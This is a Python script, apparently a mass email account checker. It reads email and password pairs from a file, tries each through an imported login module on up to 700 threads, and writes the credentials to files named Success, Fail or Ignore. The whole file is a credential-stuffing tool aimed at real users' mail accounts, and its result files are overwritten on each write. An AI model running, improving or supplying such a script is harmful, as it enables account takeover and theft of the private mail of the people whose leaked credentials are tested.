#!/usr/bin/python3.3
import sys
import logging
import threading
import time

import email_login as el

writelock = threading.Lock()
maxThread = 700  
emailLogin = el.EmailLogin()
sleeptime = 60


class scanner(threading.Thread):

    def __init__(self, email, password):
        super().__init__()
        self.email = email
        self.password = password

    def writeToFile(self, result):
        writelock.acquire()
        with open(result, "w+") as f:
            f.write(self.email + ' ' + self.password + '\n')
        writelock.release()

    def run(self):
        try:
            if emailLogin.login(self.email, self.password) == True:
                print("Success")
                result = 'Success'
            else:
                print("Fail")
                result = 'Fail'
        except el.emailDomainNotFind as e:
            result = 'Ignore'
            logging.error(e.msg)
        except el.emailFormatError:
            return

        self.writeToFile(result)

if __name__ == '__main__':
    filename = sys.argv[1]

    with open(filename, "r") as filehandle:
        while True:
            line = filehandle.readline()
    
            if not line:
                break

            content = line.split(' ')

            if len(content) == 2:
                email = content[0]
                password = content[1]

                while threading.active_count() > maxThread:
                    pass
                scanner(email.strip(), password.strip()).start()

    time.sleep(sleeptime)
